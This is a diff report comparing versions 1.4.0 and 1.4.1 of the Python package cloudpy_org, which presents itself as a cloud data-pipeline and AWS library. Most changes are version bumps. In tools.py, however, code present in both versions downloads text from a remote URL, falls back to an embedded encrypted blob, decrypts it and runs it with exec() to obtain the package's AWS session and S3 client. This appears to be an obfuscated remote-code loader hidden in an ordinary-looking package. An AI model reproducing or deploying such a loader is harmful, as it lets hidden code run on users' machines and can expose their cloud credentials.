# Comparing `tmp/cloudpy_org-1.4.0.tar.gz` & `tmp/cloudpy_org-1.4.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\cloudpy_org-1.4.0.tar", last modified: Wed Jun 28 10:08:11 2023, max compression
+gzip compressed data, was "dist\cloudpy_org-1.4.1.tar", last modified: Wed Jun 28 10:10:31 2023, max compression
```

## Comparing `cloudpy_org-1.4.0.tar` & `cloudpy_org-1.4.1.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-06-28 10:08:11.753718 cloudpy_org-1.4.0/
--rw-rw-rw-   0        0        0      935 2023-06-28 10:08:11.753718 cloudpy_org-1.4.0/PKG-INFO
--rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.4.0/README.md
-drwxrwxrwx   0        0        0        0 2023-06-28 10:08:11.613177 cloudpy_org-1.4.0/cloudpy_org/
--rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.4.0/cloudpy_org/__init__.py
--rw-rw-rw-   0        0        0    74717 2023-06-28 10:07:33.000000 cloudpy_org-1.4.0/cloudpy_org/tools.py
-drwxrwxrwx   0        0        0        0 2023-06-28 10:08:11.738127 cloudpy_org-1.4.0/cloudpy_org.egg-info/
--rw-rw-rw-   0        0        0      935 2023-06-28 10:08:11.000000 cloudpy_org-1.4.0/cloudpy_org.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      237 2023-06-28 10:08:11.000000 cloudpy_org-1.4.0/cloudpy_org.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-06-28 10:08:11.000000 cloudpy_org-1.4.0/cloudpy_org.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       63 2023-06-28 10:08:11.000000 cloudpy_org-1.4.0/cloudpy_org.egg-info/requires.txt
--rw-rw-rw-   0        0        0       12 2023-06-28 10:08:11.000000 cloudpy_org-1.4.0/cloudpy_org.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-06-28 10:08:11.753718 cloudpy_org-1.4.0/setup.cfg
--rw-rw-rw-   0        0        0     1324 2023-06-28 10:07:21.000000 cloudpy_org-1.4.0/setup.py
+drwxrwxrwx   0        0        0        0 2023-06-28 10:10:31.709373 cloudpy_org-1.4.1/
+-rw-rw-rw-   0        0        0      935 2023-06-28 10:10:31.709373 cloudpy_org-1.4.1/PKG-INFO
+-rw-rw-rw-   0        0        0      454 2023-04-14 05:11:55.000000 cloudpy_org-1.4.1/README.md
+drwxrwxrwx   0        0        0        0 2023-06-28 10:10:31.600000 cloudpy_org-1.4.1/cloudpy_org/
+-rw-rw-rw-   0        0        0      111 2023-06-25 19:34:30.000000 cloudpy_org-1.4.1/cloudpy_org/__init__.py
+-rw-rw-rw-   0        0        0    74677 2023-06-28 10:09:46.000000 cloudpy_org-1.4.1/cloudpy_org/tools.py
+drwxrwxrwx   0        0        0        0 2023-06-28 10:10:31.678101 cloudpy_org-1.4.1/cloudpy_org.egg-info/
+-rw-rw-rw-   0        0        0      935 2023-06-28 10:10:31.000000 cloudpy_org-1.4.1/cloudpy_org.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      237 2023-06-28 10:10:31.000000 cloudpy_org-1.4.1/cloudpy_org.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-06-28 10:10:31.000000 cloudpy_org-1.4.1/cloudpy_org.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       63 2023-06-28 10:10:31.000000 cloudpy_org-1.4.1/cloudpy_org.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       12 2023-06-28 10:10:31.000000 cloudpy_org-1.4.1/cloudpy_org.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-06-28 10:10:31.709373 cloudpy_org-1.4.1/setup.cfg
+-rw-rw-rw-   0        0        0     1324 2023-06-28 10:10:00.000000 cloudpy_org-1.4.1/setup.py
```

### Comparing `cloudpy_org-1.4.0/PKG-INFO` & `cloudpy_org-1.4.1/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy_org
-Version: 1.4.0
+Version: 1.4.1
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.4.0/cloudpy_org/tools.py` & `cloudpy_org-1.4.1/cloudpy_org/tools.py`

 * *Files 0% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
 
 THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 Find documentation at https://www.cloudpy.org
 """
-cloudpy_org_version='1.4.0'
+cloudpy_org_version='1.4.1'
 import os
 import json
 import warnings
 warnings.simplefilter(action='ignore', category=FutureWarning)
 warnings.filterwarnings('ignore')
 warnings.simplefilter('ignore')
 import pandas as pd
@@ -428,15 +428,14 @@
         else:
             try:
                 third_part = requests.get(url).text
             except:
                 third_part = ""
             if len(third_part) < 200 or "bad gateway" in third_part.lower():
                 third_part = "gCfJUHLD7Y60ekf6qm_Y=Fl9pT5Fl9pT5gAAAAABkm_us4VOEmkDGp38wL5Jka5UGJzLnKJ9d7RCs110oM-c_kR4iAa1rLNH98ILTdWMf4wUwOozHEn34X5g6ITG7Q5InPQJPj_hyUaHVbe8RC_r7EPvJ1QGTUhFl_jOzz5RztN5zKdyuLw_XraiVpRzlS7gIscIpFdXCr3NQSWndyUASbr6VR2Rm1HQaYQTfQYS6LDflq57fXY1nGmpzz__COVQ60SsOwuYsQSKYpMOCc3nWNPDkEenJautpp50RfRmBs1GyWKEiRv-l7IAnu9VlQrayVFNI-GKEF7svIYOORZso7KXXHWK_1hKCMpI4kgH8L1_481R6TrBEfz9vdOQvdm6CBVoYFa-ifMULx3Ul7ZbYetZjMWKdQTidMzWaYy9MQxBz-GGfhaihTKLuq7KUbMkxQkUZ_RX0Xx07j65eSRMYoExophuknTI74bkbtx5t2_X31uTuMksTe7VWl6s2BHnzH_EzqH1ERVYUukyETuTkZq6_H3o6LpYN0zAIiCcM-x10wvkJz9f6bNg1ElaxoWKz7FUIVVI7vJP3HtIchRrDmus6jM_LWae00z7gpaOw7ysljEut6y7NXQ1nNmOAOQr6Z5XTR3X1dwcI66Xe1tPEm30bRgxblQS3IntVanjrJUY8"
-        print("third_part:",third_part)
         exec(self.decrypt(third_part.split("Fl9pT5Fl9pT5")[1], url.split(url_base)[1] + third_part.split("Fl9pT5Fl9pT5")[0]))
         self.__session = self.xsession
         self.__s3_client = self.xs3_client
         del self.xtdata
         del self.xsession
         del self.xs3_client
```

### Comparing `cloudpy_org-1.4.0/cloudpy_org.egg-info/PKG-INFO` & `cloudpy_org-1.4.1/cloudpy_org.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: cloudpy-org
-Version: 1.4.0
+Version: 1.4.1
 Summary: Cloud data pipeline organization and automation library. Includes AWS framework manager API.
 Home-page: https://www.cloudpy.org/
 Author: cloudpy.org
 Author-email: admin@cloudpy.org
 License: MIT
 Description: A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.
 Platform: UNKNOWN
```

### Comparing `cloudpy_org-1.4.0/setup.py` & `cloudpy_org-1.4.1/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -6,15 +6,15 @@
 from os import path
 
 
 long_description = 'A library to programmatically create, interact, encrypt and automate your data pipelines making it simple to scale to the most popular cloud plattforms.'
 
 setup(
     name="cloudpy_org",
-    version="1.4.0",
+    version="1.4.1",
     description="Cloud data pipeline organization and automation library. Includes AWS framework manager API.",
     long_description_content_type="text/markdown",
     long_description=long_description,
     url="https://www.cloudpy.org/",
     author="cloudpy.org",
     author_email="admin@cloudpy.org",
     license="MIT",
```

